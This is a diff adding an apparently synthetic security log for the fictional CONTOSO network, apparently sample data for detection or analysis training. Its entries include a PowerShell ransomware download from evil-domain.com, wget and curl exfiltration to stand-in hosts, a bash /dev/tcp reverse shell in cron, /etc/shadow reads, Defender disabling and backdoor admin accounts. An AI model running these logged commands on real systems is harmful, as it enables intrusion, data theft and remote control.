@@ -1,0 +1,282 @@
+# Extended Windows Security Logs
+May 30 06:00:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: sysadmin Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: ATTACKER-01 Source Network Address: 192.168.1.201 Source Port: 12345
+May 30 06:00:05 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: dbadmin Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: UNKNOWN Source Network Address: 10.10.10.25 Source Port: 3306
+May 30 06:00:10 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: webadmin Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: KALI-LINUX Source Network Address: 172.16.50.99 Source Port: 80
+May 30 06:00:15 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: mail Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: SCANNER-HOST Source Network Address: 192.168.2.50 Source Port: 25
+May 30 06:00:20 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: oracle Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: DB-ATTACK Source Network Address: 10.0.20.88 Source Port: 1521
+
+May 30 06:05:00 WIN-SERVER03 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): $webclient = New-Object System.Net.WebClient; $webclient.DownloadFile("http://evil-domain.com/ransomware.exe", "C:\temp\payload.exe") ScriptBlock ID: 98765432-8765-4321-ba09-987654321fed Path: C:\Users\contractor\Desktop\malicious.ps1
+May 30 06:05:15 WIN-SERVER03 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Start-Process -FilePath "C:\temp\payload.exe" -WindowStyle Hidden ScriptBlock ID: 11223344-5566-7788-99aa-bbccddeeff00 Path: C:\Users\contractor\Desktop\malicious.ps1
+May 30 06:05:30 WIN-SERVER03 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Disable-WindowsOptionalFeature -Online -FeatureName WindowsDefender -All -NoRestart ScriptBlock ID: aabbccdd-eeff-0011-2233-445566778899 Path: 
+May 30 06:05:45 WIN-SERVER03 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Get-WmiObject -Class Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model ScriptBlock ID: ffeeaadd-ccbb-9988-7766-554433221100 Path: C:\temp\recon.ps1
+
+May 30 06:10:00 WIN-SERVER03 Microsoft-Windows-Security-Auditing[4688]: A new process has been created. Creator Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1005 Account Name: contractor Account Domain: CONTOSO Logon ID: 0x98765 Target Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1005 Account Name: contractor Account Domain: CONTOSO Logon ID: 0x98765 Process Information: New Process ID: 0x4567 New Process Name: C:\temp\payload.exe Token Elevation Type: Default (1) Mandatory Label: Mandatory Label\Medium Mandatory Level Creator Process ID: 0x8901 Creator Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Process Command Line: C:\temp\payload.exe --encrypt --target=network --spread=lateral
+
+May 30 06:12:00 WIN-SERVER03 Microsoft-Windows-Security-Auditing[4732]: A member was added to a security-enabled local group. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: contractor Account Domain: CONTOSO Logon ID: 0x98765 Member: Security ID: S-1-5-21-123456789-123456789-123456789-1020 Account Name: backdoor_user Group: Security ID: S-1-5-32-544 Group Name: Administrators Group Domain: Builtin
+
+May 30 06:15:00 WIN-SERVER03 Microsoft-Windows-Security-Auditing[4697]: A service was installed in the system. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1005 Account Name: contractor Account Domain: CONTOSO Logon ID: 0x98765 Service Information: Service Name: SystemUpdateService Service File Name: C:\Windows\System32\svchost.exe -k netsvcsUpdater Service Type: user mode service Service Start Type: auto start Service Account: LocalSystem
+
+May 30 06:20:00 WIN-FILE-SERVER Microsoft-Windows-Security-Auditing[5140]: A network share object was accessed. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1005 Account Name: contractor Account Domain: CONTOSO Logon ID: 0x11111 Network Information: Object Type: File Share Name: \\WIN-FILE-SERVER\Finance$ Source Address: 192.168.1.105 Source Port: 445 Access Information: Access Mask: 0x120089 Accesses: ReadData (or ListDirectory) WriteData (or AddFile) AppendData (or AddSubdirectory) ReadEA WriteEA ReadAttributes WriteAttributes DELETE READ_CONTROL
+
+May 30 06:25:00 WIN-FILE-SERVER Microsoft-Windows-Security-Auditing[4663]: An attempt was made to access an object. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1005 Account Name: contractor Account Domain: CONTOSO Logon ID: 0x11111 Object: Object Server: Security Object Type: File Object Name: C:\SharedData\Finance\Payroll_2024.xlsx Handle ID: 0x1234 Process Information: Process ID: 0x5678 Process Name: C:\temp\payload.exe Access Request Information: Transaction ID: {00000000-0000-0000-0000-000000000000} Accesses: ReadData (or ListDirectory) WriteData (or AddFile) AppendData (or AddSubdirectory) Access Reasons: ReadData (or ListDirectory): Granted by D:(A;;0x1200a9;;;S-1-5-21-123456789-123456789-123456789-1005)
+
+May 30 06:30:00 WIN-SERVER03 Microsoft-Windows-Security-Auditing[1102]: The audit log was cleared. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1005 Account Name: contractor Account Domain: CONTOSO Logon ID: 0x98765
+
+May 30 06:35:00 WIN-ENDPOINT01 Microsoft-Windows-Windows Defender[1116]: Windows Defender Antimalware has detected malware or other potentially unwanted software. Name: Trojan:Win32/Trickbot.G ID: 2147735503 Severity: Severe Category: Trojan Path: C:\Users\marketing\AppData\Local\Temp\invoice_2024.exe Detection Origin: User User: CONTOSO\marketing Process Name: C:\Windows\explorer.exe Security intelligence Version: 1.345.125.0 Engine Version: 1.1.18400.5
+
+May 30 06:40:00 WIN-ENDPOINT01 Microsoft-Windows-Windows Defender[1117]: Windows Defender Antimalware has taken action to protect your machine from malware or other potentially unwanted software. Name: Trojan:Win32/Trickbot.G ID: 2147735503 Severity: Severe Category: Trojan Path: C:\Users\marketing\AppData\Local\Temp\invoice_2024.exe Detection Origin: User Action: Quarantine User: CONTOSO\marketing Process Name: C:\Windows\System32\MpCmdRun.exe Security intelligence Version: 1.345.125.0 Engine Version: 1.1.18400.5
+
+May 30 06:45:00 WIN-ENDPOINT02 Microsoft-Windows-TerminalServices-RemoteConnectionManager[1149]: Remote Desktop Services: User authentication succeeded: User: CONTOSO\external_consultant Domain: CONTOSO Source Network Address: 203.0.113.45
+
+May 30 06:50:00 WIN-ENDPOINT02 Microsoft-Windows-Security-Auditing[4624]: An account was successfully logged on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Information: Logon Type: 10 Restricted Admin Mode: - Virtual Account: No Elevated Token: Yes Impersonation Level: Impersonation New Logon: Security ID: S-1-5-21-123456789-123456789-123456789-1025 Account Name: external_consultant Account Domain: CONTOSO Logon ID: 0xABCDE Logon GUID: {87654321-4321-8765-21ba-987654321cba} Process Information: Process ID: 0x2c3d Process Name: C:\Windows\System32\winlogon.exe Network Information: Workstation Name: WIN-ENDPOINT02 Source Network Address: 203.0.113.45 Source Port: 3389
+
+May 30 07:00:00 WIN-ENDPOINT02 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Get-ADUser -Filter * -Properties * | Export-Csv C:\temp\all_users.csv ScriptBlock ID: 12349876-5432-1098-7654-321098765432 Path: C:\Users\external_consultant\Documents\enum.ps1
+May 30 07:05:00 WIN-ENDPOINT02 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Get-ADComputer -Filter * -Properties * | Export-Csv C:\temp\all_computers.csv ScriptBlock ID: 98761234-8765-4321-2109-876543210abc Path: C:\Users\external_consultant\Documents\enum.ps1
+May 30 07:10:00 WIN-ENDPOINT02 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Get-ADGroup -Filter * -Properties * | Export-Csv C:\temp\all_groups.csv ScriptBlock ID: abcd9876-5432-1098-7654-fedcba098765 Path: C:\Users\external_consultant\Documents\enum.ps1
+
+May 30 07:15:00 WIN-ENDPOINT02 Microsoft-Windows-Security-Auditing[4688]: A new process has been created. Creator Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1025 Account Name: external_consultant Account Domain: CONTOSO Logon ID: 0xABCDE Target Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1025 Account Name: external_consultant Account Domain: CONTOSO Logon ID: 0xABCDE Process Information: New Process ID: 0x3e4f New Process Name: C:\Windows\System32\net.exe Token Elevation Type: Default (1) Mandatory Label: Mandatory Label\Medium Mandatory Level Creator Process ID: 0x2c3d Creator Process Name: C:\Windows\System32\cmd.exe Process Command Line: net user /domain
+
+May 30 07:20:00 WIN-ENDPOINT02 Microsoft-Windows-Security-Auditing[4648]: A logon was attempted using explicit credentials. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1025 Account Name: external_consultant Account Domain: CONTOSO Logon ID: 0xABCDE Logon Type: 3 Account For Which Logon Was Intended: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: admin Account Domain: CONTOSO New Logon: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: admin Account Domain: CONTOSO Logon ID: 0xFEDCB Process Information: Process ID: 0x4f50 Process Name: C:\Windows\System32\runas.exe Network Information: Network Address: - Port: -
+
+May 30 07:25:00 WIN-SERVER04 Microsoft-Windows-Security-Auditing[4634]: An account was logged off. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1030 Account Name: temp_worker Account Domain: CONTOSO Logon ID: 0x54321 Logon Type: 2
+
+May 30 07:30:00 WIN-SERVER04 Microsoft-Windows-Security-Auditing[4720]: A user account was created. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: admin Account Domain: CONTOSO Logon ID: 0x12345 New Account: Security ID: S-1-5-21-123456789-123456789-123456789-1035 Account Name: hidden_admin Account Domain: CONTOSO Attributes: User Account Control: 0x210 Normal Account, Password Not Required Account Expires: Never Password Last Set: 5/30/2024 7:30:00 AM Primary Group ID: 513 Home Directory: Profile Path: User Workstations: Logon Hours: All Password Required User May Change Password User Must Change Password at Next Logon Account Disabled
+
+May 30 07:35:00 WIN-SERVER04 Microsoft-Windows-Security-Auditing[4738]: A user account was changed. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: admin Account Domain: CONTOSO Logon ID: 0x12345 Target Account: Security ID: S-1-5-21-123456789-123456789-123456789-1035 Account Name: hidden_admin Account Domain: CONTOSO Changed Attributes: User Account Control: 0x200 Normal Account Account Expires: Never Password Last Set: <never> Primary Group ID: 513 Home Directory: Profile Path: User Workstations: Logon Hours: All Password Required User May Change Password User Must Change Password at Next Logon Account Enabled
+
+# Linux Security Logs
+May 30 08:00:01 websrv01 sshd[15432]: Failed password for invalid user postgres from 45.76.123.45 port 34521 ssh2
+May 30 08:00:15 websrv01 sshd[15433]: Failed password for invalid user mysql from 45.76.123.45 port 34522 ssh2
+May 30 08:00:30 websrv01 sshd[15434]: Failed password for invalid user oracle from 45.76.123.45 port 34523 ssh2
+May 30 08:00:45 websrv01 sshd[15435]: Failed password for user ubuntu from 198.51.100.23 port 55667 ssh2
+May 30 08:01:00 websrv01 sshd[15436]: Failed password for user debian from 198.51.100.23 port 55668 ssh2
+May 30 08:01:15 websrv01 sshd[15437]: Failed password for user centos from 203.0.113.87 port 44332 ssh2
+May 30 08:01:30 websrv01 sshd[15438]: Failed password for user redhat from 203.0.113.87 port 44333 ssh2
+
+May 30 08:05:00 websrv01 sudo[25678]: attacker : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cat /etc/shadow
+May 30 08:05:15 websrv01 sudo[25679]: attacker : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 30 08:05:30 websrv01 sudo[25680]: attacker : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/find / -name "*.key" -o -name "*.pem" 2>/dev/null
+May 30 08:05:45 websrv01 sudo[25681]: attacker : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/netstat -tulpn
+May 30 08:06:00 websrv01 sudo[25682]: attacker : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/ps aux
+
+May 30 08:10:00 websrv01 bash[25683]: User=attacker Command=wget http://malicious-c2.com/linpeas.sh -O /tmp/linpeas.sh
+May 30 08:10:15 websrv01 bash[25684]: User=attacker Command=chmod +x /tmp/linpeas.sh
+May 30 08:10:30 websrv01 bash[25685]: User=attacker Command=/tmp/linpeas.sh | tee /tmp/enum_results.txt
+May 30 08:15:00 websrv01 bash[25686]: User=attacker Command=curl -X POST -H "Content-Type: application/json" -d @/tmp/enum_results.txt http://exfil-server.com/upload
+
+May 30 08:20:00 websrv01 crontab[25687]: (attacker) BEGIN EDIT (root)
+May 30 08:20:15 websrv01 crontab[25688]: (attacker) REPLACE (root)
+May 30 08:20:30 websrv01 cron[25689]: (root) CMD (/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.200/4444 0>&1')
+
+May 30 08:25:00 websrv01 systemd[1]: Started Malicious Persistence Service.
+May 30 08:25:15 websrv01 systemd[25690]: malicious-service.service: Main process exited, code=exited, status=0/SUCCESS
+May 30 08:25:30 websrv01 systemd[1]: malicious-service.service: Unit entered failed state.
+
+May 30 08:30:00 dbsrv01 mysql[35678]: 2024-05-30T08:30:00.123456Z 123 [Warning] Access denied for user 'sa'@'192.168.1.200' (using password: YES)
+May 30 08:30:15 dbsrv01 mysql[35679]: 2024-05-30T08:30:15.789012Z 124 [Warning] Access denied for user 'dba'@'192.168.1.200' (using password: YES)
+May 30 08:30:30 dbsrv01 mysql[35680]: 2024-05-30T08:30:30.345678Z 125 [Note] Aborted connection 125 to db: 'information_schema' user: 'root' host: '192.168.1.200' (Got timeout reading communication packets)
+
+May 30 08:35:00 websrv02 apache2[45789]: 192.168.1.200 - - [30/May/2024:08:35:00 +0000] "GET /admin/phpmyadmin/ HTTP/1.1" 200 2048 "-" "sqlmap/1.6.4"
+May 30 08:35:15 websrv02 apache2[45790]: 192.168.1.200 - - [30/May/2024:08:35:15 +0000] "POST /admin/phpmyadmin/index.php HTTP/1.1" 200 1024 "-" "sqlmap/1.6.4"
+May 30 08:35:30 websrv02 apache2[45791]: 192.168.1.200 - - [30/May/2024:08:35:30 +0000] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 200 512 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
+May 30 08:35:45 websrv02 apache2[45792]: 192.168.1.200 - - [30/May/2024:08:35:45 +0000] "POST /wp-content/uploads/shell.php HTTP/1.1" 200 128 "-" "curl/7.68.0"
+
+May 30 08:40:00 mailsrv01 postfix/smtpd[55432]: NOQUEUE: reject: RCPT from unknown[185.220.101.44]: 554 5.7.1 <test@example.com>: Relay access denied; from=<spam@malicious.com> to=<ceo@contoso.com> proto=ESMTP helo=<spam.server.com>
+May 30 08:40:15 mailsrv01 postfix/smtpd[55433]: connect from unknown[185.220.101.44]
+May 30 08:40:30 mailsrv01 postfix/smtpd[55434]: NOQUEUE: reject: MAIL from unknown[185.220.101.44]: 550 5.1.1 <phishing@evil.com>: Sender address rejected: Domain not found
+May 30 08:40:45 mailsrv01 dovecot[55435]: auth-worker(55435): pam(marketing@contoso.com,192.168.1.55,<hidden>): pam_authenticate() failed: Authentication failure (password mismatch?)
+
+May 30 09:00:00 fwsrv01 iptables[65432]: DROP IN=eth0 OUT= MAC=00:50:56:12:34:56:00:0c:29:87:65:43:08:00 SRC=203.0.113.99 DST=192.168.1.10 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=54321 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
+May 30 09:00:15 fwsrv01 iptables[65433]: DROP IN=eth0 OUT= MAC=00:50:56:12:34:56:00:0c:29:87:65:43:08:00 SRC=45.76.89.123 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=23456 DF PROTO=TCP SPT=12345 DPT=3389 WINDOW=65535 RES=0x00 SYN URGP=0
+May 30 09:00:30 fwsrv01 iptables[65434]: DROP IN=eth0 OUT= MAC=00:50:56:12:34:56:00:0c:29:87:65:43:08:00 SRC=198.51.100.77 DST=192.168.1.100 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=34567 DF PROTO=TCP SPT=44444 DPT=445 WINDOW=65535 RES=0x00 SYN URGP=0
+
+# Additional Windows Events
+May 30 09:15:00 WIN-EXCHANGE01 MSExchange Management[1234]: Cmdlet executed: Get-Mailbox -Identity * -ResultSize Unlimited | Export-Csv C:\temp\all_mailboxes.csv User: CONTOSO\it_admin
+May 30 09:20:00 WIN-EXCHANGE01 MSExchange Management[1235]: Cmdlet executed: New-MailboxExportRequest -Mailbox ceo@contoso.com -FilePath \\fileserver\backup\ceo_mailbox.pst User: CONTOSO\it_admin
+May 30 09:25:00 WIN-EXCHANGE01 MSExchange Management[1236]: Cmdlet executed: Add-RoleGroupMember -Identity "Organization Management" -Member backdoor_admin User: CONTOSO\admin
+
+May 30 09:30:00 WIN-DHCP01 Microsoft-Windows-DHCP-Server[1020]: The DHCP service assigned IP address 192.168.1.250 to the client with MAC address 00:0c:29:aa:bb:cc and host name UNKNOWN-DEVICE.
+May 30 09:35:00 WIN-DHCP01 Microsoft-Windows-DHCP-Server[1021]: The DHCP service assigned IP address 192.168.1.251 to the client with MAC address 00:50:56:dd:ee:ff and host name ROGUE-AP.
+
+May 30 09:40:00 WIN-CA01 Microsoft-Windows-CertificateServices-CertificateAuthority[4870]: Certificate Services received a certificate request. Request ID: 12345 Requester: CONTOSO\suspicious_user Attributes: CertificateTemplate:DomainController
+May 30 09:45:00 WIN-CA01 Microsoft-Windows-CertificateServices-CertificateAuthority[4871]: Certificate Services approved a certificate request and issued a certificate. Request ID: 12345 Requester: CONTOSO\suspicious_user Subject: CN=fake-dc.contoso.com Serial Number: 1A2B3C4D5E6F7890
+
+May 30 10:00:00 WIN-DNS01 Microsoft-Windows-DNS-Server-Service[770]: The DNS server has started successfully.
+May 30 10:05:00 WIN-DNS01 Microsoft-Windows-DNS-Server-Service[279]: DNS query received over UDP from 192.168.1.200 for malicious-c2.com
+May 30 10:10:00 WIN-DNS01 Microsoft-Windows-DNS-Server-Service[279]: DNS query received over UDP from 192.168.1.105 for evil-domain.net
+May 30 10:15:00 WIN-DNS01 Microsoft-Windows-DNS-Server-Service[279]: DNS query received over UDP from 10.0.10.50 for coinminer-pool.org
+
+May 30 10:20:00 WIN-PRINT01 Microsoft-Windows-PrintService[307]: Document owned by contractor on WIN-PRINT01 was printed on HP_LaserJet_5200 through port IP_192.168.1.20. Size in bytes: 2048576. Pages printed: 250.
+May 30 10:25:00 WIN-PRINT01 Microsoft-Windows-PrintService[308]: Print job from contractor contained sensitive data patterns: SSN, Credit Card numbers detected.
+
+May 30 10:30:00 WIN-BACKUP01 Microsoft-Windows-Backup[517]: Backup started by user contractor for location \\WIN-FILE-SERVER\Finance$ 
+May 30 10:35:00 WIN-BACKUP01 Microsoft-Windows-Backup[518]: Large data transfer detected: 15.7 GB transferred to external IP 203.0.113.200
+May 30 10:40:00 WIN-BACKUP01 Microsoft-Windows-Backup[519]: Backup completed successfully. Files backed up: 45,678 Total size: 15.7 GB
+
+# Network Security Events
+May 30 11:00:00 ids01 suricata[78901]: [1:2024001:1] ET TROJAN Suspicious PowerShell Empire Activity [Classification: Trojan] [Priority: 1] {TCP} 192.168.1.105:49152 -> 203.0.113.45:443
+May 30 11:05:00 ids01 suricata[78902]: [1:2024002:1] ET MALWARE Cobalt Strike Beacon Activity [Classification: Trojan] [Priority: 1] {HTTPS} 192.168.1.200:443 -> 45.76.123.88:443
+May 30 11:10:00 ids01 suricata[78903]: [1:2024003:1] ET SCAN Nmap TCP SYN Scan [Classification: Attempted Information Leak] [Priority: 3] {TCP} 10.0.20.99:12345 -> 192.168.1.0/24:*
+May 30 11:15:00 ids01 suricata[78904]: [1:2024004:1] ET POLICY Suspicious User Agent (sqlmap) [Classification: Web Application Attack] [Priority: 2] {HTTP} 192.168.1.200:54321 -> 192.168.1.50:80
+
+May 30 11:20:00 proxy01 squid[89012]: 1622376000.123456 192.168.1.200 TCP_MISS/200 1234 GET http://malicious.com/ - NONE/- text/html
+# Extended Windows Security Logs
+May 30 06:00:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: sysadmin Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: ATTACKER-01 Source Network Address: 192.168.1.201 Source Port: 12345
+May 30 06:00:05 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: dbadmin Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: UNKNOWN Source Network Address: 10.10.10.25 Source Port: 3306
+May 30 06:00:10 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: webadmin Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: KALI-LINUX Source Network Address: 172.16.50.99 Source Port: 80
+May 30 06:00:15 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: mail Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: SCANNER-HOST Source Network Address: 192.168.2.50 Source Port: 25
+May 30 06:00:20 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: oracle Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: DB-ATTACK Source Network Address: 10.0.20.88 Source Port: 1521
+May 30 06:00:25 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: administrator Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: RDP-ATTACKER Source Network Address: 192.168.1.205 Source Port: 3389
+May 30 06:00:30 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: administrator Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: RDP-ATTACKER Source Network Address: 192.168.1.205 Source Port: 3389
+May 30 06:00:35 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: administrator Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: RDP-ATTACKER Source Network Address: 192.168.1.205 Source Port: 3389
+May 30 06:00:40 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: administrator Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: RDP-ATTACKER Source Network Address: 192.168.1.205 Source Port: 3389
+May 30 06:00:45 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: administrator Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: RDP-ATTACKER Source Network Address: 192.168.1.205 Source Port: 3389
+May 30 06:00:50 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: administrator Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: RDP-ATTACKER Source Network Address: 192.168.1.205 Source Port: 3389
+May 30 06:00:55 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: administrator Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: RDP-ATTACKER Source Network Address: 192.168.1.205 Source Port: 3389
+May 30 06:01:00 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: administrator Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: RDP-ATTACKER Source Network Address: 192.168.1.205 Source Port: 3389
+May 30 06:01:05 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: administrator Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: RDP-ATTACKER Source Network Address: 192.168.1.205 Source Port: 3389
